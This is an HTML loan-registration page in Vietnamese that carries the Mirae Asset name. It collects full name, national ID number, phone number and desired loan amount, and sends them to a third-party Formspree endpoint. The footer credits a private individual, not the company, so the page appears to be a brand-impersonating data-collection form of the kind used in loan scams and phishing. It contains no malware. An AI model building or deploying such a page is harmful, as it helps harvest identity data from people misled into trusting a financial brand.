<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Đăng Ký Vay - Mirae Asset</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #004a99, #00aaff);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    form {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      max-width: 420px;
      width: 100%;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #004a99;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      background: #004a99;
      color: #fff;
      border: none;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #0066cc;
    }
    label {
      font-weight: bold;
      color: #333;
    }
    footer {
      margin-top: 20px;
      text-align: center;
      color: #fff;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <form action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
    <h2>Đăng Ký Vay Mirae Asset</h2>
    <label>Họ và tên:</label>
    <input type="text" name="Họ và tên" placeholder="Nhập họ tên" required />

    <label>Số CCCD:</label>
    <input type="text" name="CCCD" placeholder="Nhập số CCCD" required />

    <label>Số điện thoại:</label>
    <input type="tel" name="Số điện thoại" placeholder="Nhập số điện thoại" required />

    <label>Số tiền muốn vay:</label>
    <input type="text" id="soTien" name="Số tiền muốn vay" placeholder="VD: 50.000.000" required />

    <button type="submit">Gửi đăng ký</button>
  </form>

  <footer>
    © Copyright 2025 Võ Quốc Thiên. Giải Pháp Vay Tiêu Dùng Uy Tín & Linh Hoạt
  </footer>

  <script>
    const soTienInput = document.getElementById('soTien');
    soTienInput.addEventListener('input', function(e) {
      let value = this.value.replace(/\D/g, '');
      if (value) {
        this.value = Number(value).toLocaleString('vi-VN');
      } else {
        this.value = '';
      }
    });
  </script>
</body>
</html>
